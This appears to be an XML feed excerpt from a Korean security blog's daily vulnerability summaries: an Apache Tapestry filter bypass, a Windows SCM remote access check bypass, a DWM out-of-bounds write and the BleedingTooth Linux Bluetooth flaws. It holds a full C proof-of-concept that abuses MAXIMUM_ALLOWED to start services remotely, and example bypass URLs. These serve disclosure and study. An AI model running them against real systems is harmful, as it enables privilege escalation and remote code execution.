      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>xss</tag>
      
      <tag>Fabu1ous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27850: Apache Tapestry CVE-2019-0195 Bypass </title>
    <link href="/2021/04/16/l0ch/2021-04-16/"/>
    <url>/2021/04/16/l0ch/2021-04-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/23">CVE-2021-27850: Apache Tapestry: Bypass of the fix for CVE-2019-0195</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Tapestry 5.4.5, 5.5.0, 5.6.2 &#xBC0F; 5.7.0 &#xC774;&#xC804; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC624;&#xD508;&#xC18C;&#xC2A4; &#xC6F9; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC778; Apache Tapestry&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810; CVE-2019-0195 &#xD328;&#xCE58; &#xC6B0;&#xD68C;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CVE-2019-0195&#xB294; &#xC784;&#xC758;&#xC758; &#xD074;&#xB798;&#xC2A4; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xD574;&#xCEE4;&#xAC00; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; serialized Java &#xAC1D;&#xCCB4; &#xC11C;&#xBA85;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>HMAC</code> &#xBE44;&#xBC00; &#xD0A4;&#xB97C; &#xC54C;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xD68D;&#xB4DD;&#xD55C; <code>HMAC</code> &#xBE44;&#xBC00; &#xD0A4;&#xB85C; <code>CommonsBeanUtils1</code>&#xACFC; &#xAC19;&#xC740; Java RCE gadget &#xCCB4;&#xC778;&#xC5D0; &#xC11C;&#xBA85;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC774;&#xB294; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xCDE8;&#xC57D;&#xC810;&#xC740; URL request&#xC5D0; <code>.class</code> , <code>.properties</code> , <code>.xml</code> &#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC73C;&#xB098; payload URL&#xC758; &#xB05D;&#xC5D0; <code>/</code> &#xB97C; &#xCD94;&#xAC00;&#xD558;&#xBA74; &#xD544;&#xD130;&#xB9C1;&#xC744; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC6B0;&#xD68C;&#xD574; &#xAE30;&#xC874; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">http:<span class="hljs-comment">//[host ip]/assets/.../services/AppModule.class   -&gt; &quot;.class&quot; &#xD544;&#xD130;&#xB9C1; &#xC801;&#xC6A9;&#xB428; </span>http:<span class="hljs-comment">//[host ip]/assets/.../services/AppModule.class/  -&gt; &quot;.class&quot; &#xD544;&#xD130;&#xB9C1; &#xC6B0;&#xD68C;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>bypass</tag>
      
      <tag>rce</tag>
      
      <tag>deserialization</tag>
      
      <tag>apache</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows SCM Remote Access Check Limit Bypass EoP</title>
    <link href="/2021/04/15/insu/2021-04-15/"/>
    <url>/2021/04/15/insu/2021-04-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2147">Issue 2147: Windows: SCM Remote Access Check Limit Bypass EoP</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 20H2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows 10 1709 &#xC774;&#xD6C4; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; local admin group&#xC774; &#xC544;&#xB2CC; &#xC6D0;&#xACA9; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>SCM</code> &#xBC0F; <code>service access</code>&#xC5D0; &#xC811;&#xADFC; &#xD560; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; local &#xAD00;&#xB9AC;&#xC790; &#xADF8;&#xB8F9;&#xC5D0; &#xC5C6;&#xB294; &#xACBD;&#xC6B0; <code>OpenSCManager</code> &#xB610;&#xB294; <code>OpenService</code>&#xC5D0; &#xC804;&#xB2EC;&#xB41C; <code>Access mask</code>&#xAC00; <code>0xD0072</code>&#xC5D0; &#xB300;&#xD574; <code>ScAccessCheckAndAudit</code>&#xC5D0;&#xC11C; &#xAC80;&#xC0AC;&#xB429;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; access mask&#xC5D0; access &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xC73C;&#xBA74; SCM&#xC774; <code>access denied error</code>&#xC640; &#xD568;&#xAED8; &#xAC70;&#xC808;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xC6D0;&#xACA9; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>SERVICE_START</code> &#xD639;&#xC740; <code>SC_MANAGER_CREATE_SERVICE</code>&#xB97C; &#xC0AC;&#xC6A9; &#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC6D0;&#xD558;&#xB294; access &#xAD8C;&#xD55C;&#xC740; RPC &#xD638;&#xCD9C;&#xC5D0;&#xC11C; <code>NtAccessCheckAndAuditAlarm</code>&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xACE0; access &#xAD8C;&#xD55C;&#xC740; <code>Service Handle</code>&#xC5D0; &#xB2E4;&#xC2DC; &#xAE30;&#xB85D;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xC774; &#xAC80;&#xC99D;&#xC740; <code>MAXIMUM_ALLOWED</code>&#xB97C; request &#xD568;&#xC73C;&#xB85C;&#xC368; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. POC &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><span class="hljs-comment">#include &lt;windows.h&gt;</span>int wmain(int argc, wchar_t** argv){    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">3</span>)    {        printf(<span class="hljs-string">&quot;Usage: HostName ServiceName\\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    auto scm = OpenSCManager(argv[<span class="hljs-number">1</span>], nullptr, MAXIMUM_ALLOWED);    <span class="hljs-keyword">if</span> (scm == nullptr)    {        printf(<span class="hljs-string">&quot;[ERROR]: Failed to open SCM error:%d\\n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    }    auto service = OpenService(scm, argv[<span class="hljs-number">2</span>], SERVICE_START);    <span class="hljs-keyword">if</span> (service)    {        printf(<span class="hljs-string">&quot;[ERROR]: Was granted SERVICE_START when we didn&apos;t expect it. Maybe using the wrong user?\\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    }    DWORD error = GetLastError();    <span class="hljs-keyword">if</span> (error == ERROR_SERVICE_DOES_NOT_EXIST)    {        printf(<span class="hljs-string">&quot;[ERROR]: Service doesn&apos;t exist.\\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    }    <span class="hljs-keyword">if</span> (error != ERROR_ACCESS_DENIED)    {        printf(<span class="hljs-string">&quot;[ERROR]: Expected ERROR_ACCESS_DENIED but got %d, the rest might not work.\\n&quot;</span>, GetLastError());    }    service = OpenService(scm, argv[<span class="hljs-number">2</span>], MAXIMUM_ALLOWED);    <span class="hljs-keyword">if</span> (service == nullptr)    {        printf(<span class="hljs-string">&quot;[ERROR]: Failed to open service error:%d\\n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    }    error = ERROR_SUCCESS;    <span class="hljs-keyword">if</span> (!StartService(service, <span class="hljs-number">0</span>, nullptr))    {        error = GetLastError();    }    switch (error)    {        case ERROR_ACCESS_DENIED:            printf(<span class="hljs-string">&quot;[ERROR]: Got access denied error.\\n&quot;</span>);            <span class="hljs-keyword">break</span>;        case ERROR_SUCCESS:            printf(<span class="hljs-string">&quot;[SUCCESS]: Successfully started service.\\n&quot;</span>);            <span class="hljs-keyword">break</span>;        case ERROR_SERVICE_DISABLED:            printf(<span class="hljs-string">&quot;[SUCCESS]: Service was disabled but passed the access check.\\n&quot;</span>);            <span class="hljs-keyword">break</span>;        default:            printf(<span class="hljs-string">&quot;[WARNING]: Didn&apos;t start service but didn&apos;t get back expected error:%d\\n&quot;</span>, error);    }    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>windows</tag>
      
      <tag>scm</tag>
      
      <tag>bypass</tag>
      
      <tag>eop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-28310: Desktop Window Manager out-of-bound write 취약점</title>
    <link href="/2021/04/15/idioth/2021-04-15/"/>
    <url>/2021/04/15/idioth/2021-04-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securelist.com/zero-day-vulnerability-in-desktop-window-manager-cve-2021-28310-used-in-the-wild/101898/">Zero-day vulnerability in Desktop Window Manager (CVE-2021-28310) used in the wild</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows OS &#xBE4C;&#xB4DC; 19041.928 &#xC774;&#xD558; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows &#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xCC3D; &#xAD00;&#xB9AC;&#xC790;(Desktop Window Manager, <code>dwm.exe</code>)&#xC758; <code>dwmcore.dll</code>&#xC5D0;&#xC11C; out-of-bounds write &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; DirectComposition API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/directcomp/directcomposition-portal">DirectComposition</a>&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC18C;&#xC2A4;(GDI, DirectX &#xB4F1;)&#xC758; &#xBE44;&#xD2B8;&#xB9F5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xBCC0;&#xD658;, &#xD6A8;&#xACFC;, &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158; &#xBE44;&#xD2B8;&#xB9F5; &#xAD6C;&#xC131;&#xC744; &#xC704;&#xD574; Windows 8&#xC5D0;&#xC11C; &#xB3C4;&#xC785;&#xB41C; Windows &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;. DirectComposition API&#xB294; <code>win32kbase.sys</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xAD00;&#xB828;&#xB41C; syscall&#xC740; <code>NtDComposition</code>&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; 3&#xAC1C;&#xC758; syscall&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. <code>NtDCompositionCreateChannel</code>&#xC740; <code>NtDCompositionProcessChannelBatchBuffer</code>&#xC640; &#xD568;&#xAED8; &#xCC44;&#xB110;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xC5EC; kernel batch mode&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB418;&#xB3C4;&#xB85D; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; DirectComposition&#xC744; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xCEE4;&#xB110;&#xC5D0; &#xC758;&#xD574; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xCC98;&#xB9AC;&#xB418;&#xC9C0;&#xB9CC; &#xBA85;&#xB839;&#xC5B4;&#xB4E4;&#xC740; &#xB2E4;&#xB978; &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; serialize &#xB418;&#xC5B4; Local Procedure Call(LPC) &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC5D0;&#xC11C; Desktop Window Manager(<code>dwm.exe</code>)&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xACE0; &#xD654;&#xBA74;&#xC5D0; &#xCD9C;&#xB825;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xD504;&#xB85C;&#xC2DC;&#xC800;&#xB294; <code>NtDCompositionCommitChannel</code>&#xC5D0; &#xC758;&#xD574; &#xCD08;&#xAE30;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; 3&#xAC00;&#xC9C0; &#xBA85;&#xB839;&#xC5B4;(<code>CreateResource</code>, <code>ReleaseResource</code>, <code>SetResourceBufferProperty</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. <code>dwmcore.dll</code>&#xC758; <code>CPropertySet::ProcessSetPropertyValue</code> &#xD568;&#xC218;&#xB294; <code>SetResourceBufferProperty</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. D2DVector2&#xB85C; expression type&#xC774; &#xC124;&#xC815;&#xB41C; <code>SetResourceBufferProperty</code>&#xC758; &#xACBD;&#xC6B0; <code>CPropertySet::ProcessSetPropertyValue</code>&#xC5D0;&#xC11C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC5EC;&#xBD80;&#xC5D0; &#xB530;&#xB77C; <code>CPropertySet::AddProperty&lt;D2DVector2&gt;</code> &#xD639;&#xC740; <code>CPropertySet::UpdateProperty&lt;D2DVector2&gt;</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>UpdateProperty</code>&#xC5D0;&#xC11C; <code>propertyId</code>&#xAC00; &#xB9AC;&#xC18C;&#xC2A4;&#xC5D0; &#xCD94;&#xAC00;&#xB41C; property &#xC218;&#xBCF4;&#xB2E4; &#xC791;&#xC740;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544; property &#xBC30;&#xC5F4; &#xB0B4;&#xBD80; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xB450; &#xAC00;&#xC9C0; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xBA74; <code>propertiesData</code> &#xBC84;&#xD37C;&#xB97C; &#xC9C0;&#xB098; OOB write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xAC00; <code>dwm.exe</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; heap spray&#xB97C; &#xD1B5;&#xD574; &#xC774; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD55C; &#xD6C4; &#xC870;&#xC791;&#xB41C; <code>propertyId</code>&#xB85C; &#xBA85;&#xB839;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74; <code>NtDCompositionProcessChannelBatchBuffer</code>&#xC5D0;&#xC11C; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xACE0; &#xBA85;&#xB839;&#xC5B4;&#xAC00; <code>dwm.exe</code>&#xC5D0; &#xC804;&#xC1A1;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. kernel mode <code>UpdateProperty&lt;D2DVector2&gt;</code>&#xC758; <code>propertiesCount</code> &#xAC80;&#xC0AC;&#xB294; user mode&#xC5D0;&#xC11C;&#xC758; &#xC545;&#xC131; &#xBA85;&#xB839; &#xC2E4;&#xD589;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; kernel mode <code>AddProperty</code>&#xB294; user mode&#xC640; &#xC720;&#xC0AC;&#xD558;&#xAC8C; &#xC791;&#xB3D9;&#xD558;&#xBA70; &#xC0DD;&#xC131;&#xB41C; property&#xC758; <code>propertyId</code>&#xC640; <code>storageOffset</code>&#xC774; &#xC81C;&#xACF5;&#xB41C; &#xAC12;&#xACFC; &#xB3D9;&#xC77C;&#xD55C;&#xC9C0;&#xB9CC; &#xD655;&#xC778;&#xD558;&#xACE0; &#xB2E4;&#xB974;&#xBA74; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. <code>AddProperty</code>&#xB97C; &#xD1B5;&#xD574; &#xC0C8; &#xC18D;&#xC131;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xD568;&#xC218;&#xAC00; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA74; kernel mode&#xC640; user mode &#xB3D9;&#xC77C; &#xB9AC;&#xC18C;&#xC2A4; &#xAC04;&#xC5D0; property &#xC218;&#xC758; &#xBD88;&#xC77C;&#xCE58;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; kernel mode <code>propertiesCount</code> &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; <code>dwm.exe</code>&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC5B4; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>oob write</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] BleedingTooth: Zero-Click RCE</title>
    <link href="/2021/04/14/fabu1ous/2021-04-14/"/>
    <url>/2021/04/14/fabu1ous/2021-04-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup">BleedingTooth: Linux Bluetooth Zero-Click RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 4.19 (with Bluetooth 5)</p><p>Linux kernel &lt;= 3.6</p><p>Linux kernel &gt;= 4.8</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>BleedingTooth&#xB77C; &#xBD88;&#xB9AC;&#xB294; &#xCDE8;&#xC57D;&#xC810; 3&#xAC1C;&#xC758; Write-up&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. BleedingTooth&#xB294; Linux Bluetooth subsystem&#xC758; &#xC81C;&#xB85C; &#xD074;&#xB9AD; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xB85C;, &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC8FC;&#xB85C; &#xBE14;&#xB8E8;&#xD22C;&#xC2A4; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC758; &#xC601;&#xD5A5;&#xC740; &#xD38C;&#xC6E8;&#xC5B4; &#xC120;&#xC5D0; &#xBA38;&#xBB3C;&#xAC70;&#xB098; &#xB370;&#xC774;&#xD130; &#xB3C4;&#xCCAD; &#xBC0F; &#xC870;&#xC791;&#xC5D0; &#xBA38;&#xBB34;&#xB294; &#xBC18;&#xBA74; BleedingTooth&#xB294; &#xAE30;&#xAE30; &#xC804;&#xCCB4;&#xB97C; &#xC644;&#xC804;&#xD788; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>BadVibes(CVE-2020-24490) Heap-based Buffer Overflow</p><p>&#xAE30;&#xC874; 31 bytes &#xC600;&#xB358;  <a href="https://www.silabs.com/community/wireless/bluetooth/knowledge-base.entry.html/2017/02/10/bluetooth_advertisin-hGsf">Advertising data</a>&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xBE14;&#xB8E8;&#xD22C;&#xC2A4;5&#xC5D0;&#xC120; 255 bytes&#xAE4C;&#xC9C0; &#xD655;&#xC7A5;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xC5D0; &#xB9DE;&#xCDB0; 255 bytes&#xAE4C;&#xC9C0; &#xD655;&#xC7A5;&#xB41C; Advertisement report&#xB97C; &#xD30C;&#xC2F1; &#xD558;&#xB294; &#xD568;&#xC218; <code>hci_le_ext_adv_report()</code>&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xAE30;&#xC874;<code>hci_le_adv_report()</code>&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB358; size check&#xAC00; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xB294; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; overflow&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul><ul><li><p>BadChoice(CVE-2020-12352) Stack-Based Information Leak</p><p>A2MP &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC758; <code>A2MP_GETINFO_REQ</code> &#xCEE4;&#xBA58;&#xB4DC;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>a2mp_getinfo_req()</code>&#xB294; HCI device id&#xB97C; &#xC0AC;&#xC6A9; &#xC911;&#xC778; AMP&#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xC694;&#xCCAD;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC;, &#xB9CC;&#xC57D; <code>HCI_AMP</code>&#xAC00; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xB2E4;&#xBA74; request&#xB97C; &#xBC1B;&#xC740; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC740;  <code>A2MP_STATUS_INVALID_CTRL_ID</code>&#xB97C; &#xC751;&#xB2F5;&#xD569;&#xB2C8;&#xB2E4;.  &#xC774; &#xB54C; &#xCD08;&#xAE30;&#xD654; &#xC644;&#xC804;&#xD788; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC740; &#xD0D3;&#xC5D0; <code>A2MP_STATUS_INVALID_CTRL_ID</code>&#xAC00; 16 bytes&#xC758; &#xCEE4;&#xB110; &#xC2A4;&#xD0DD; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xCC44;&#xB85C; &#xD574;&#xCEE4;&#xC5D0;&#xAC8C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;.</p></li></ul><ul><li><p>BadKarma: Heap-Based Type Confusion (CVE-2020-12351)</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">l2cap_data_rcv</span><span class="hljs-params">(struct l2cap_chan *chan, struct sk_buff *skb)</span></span><span class="hljs-function"></span>{...<span class="hljs-keyword">if</span> ((chan-&gt;mode == L2CAP_MODE_ERTM ||     chan-&gt;mode == L2CAP_MODE_STREAMING) &amp;&amp; sk_filter(chan-&gt;data, skb))<span class="hljs-keyword">goto</span> drop;...}<span class="hljs-function"><span class="hljs-keyword">static</span> struct amp_mgr *<span class="hljs-title">amp_mgr_create</span><span class="hljs-params">(struct l2cap_conn *conn, <span class="hljs-keyword">bool</span> locked)</span></span><span class="hljs-function"></span>{<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">amp_mgr</span> *<span class="hljs-title">mgr</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">l2cap_chan</span> *<span class="hljs-title">chan</span>;</span>mgr = kzalloc(<span class="hljs-keyword">sizeof</span>(*mgr), GFP_KERNEL);<span class="hljs-keyword">if</span> (!mgr)<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;...chan = a2mp_chan_open(conn, locked);<span class="hljs-keyword">if</span> (!chan) {kfree(mgr);<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;}mgr-&gt;a2mp_chan = chan;chan-&gt;data = mgr;...<span class="hljs-keyword">return</span> mgr;}</code></pre><p>&#xD568;&#xC218; <code>sk_filter()</code>&#xB294; <code>struct sock</code>&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xBC18;&#xBA74;, argument&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; <code>chan-&gt;data</code>&#xC758; &#xD0C0;&#xC785;&#xC740; <code>struct amp_mgr</code>&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; remote type confusion &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. </p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>zero click</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Exploit Windows RPC to bypass CFG mitigation</title>
    <link href="/2021/04/14/fabu1ous/cfg-bypass/"/>
    <url>/2021/04/14/fabu1ous/cfg-bypass/</url>
    
